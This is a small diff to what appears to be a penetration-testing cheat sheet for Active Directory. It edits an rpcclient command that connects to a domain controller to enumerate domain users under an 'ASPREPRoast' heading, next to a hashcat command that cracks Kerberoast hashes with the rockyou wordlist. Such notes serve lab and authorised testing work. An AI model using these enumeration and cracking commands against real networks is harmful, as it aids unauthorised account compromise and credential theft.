@@ -322,7 +322,7 @@ hashcat -m 13100 -a 0 hash_spn.txt /usr/share/wordlists/rockyou.txt --show --for
 
 ##### ASPREPRoast Attack - Get tickets without pwd
 ```Shell
-rpcclient -U "jenriquez" -W <pwd> 192.168.100.20
+rpcclient -U "jenriquez" -W "yuncorp.local" 192.168.100.20
 >enumdomusers
 ```
 ```Shell
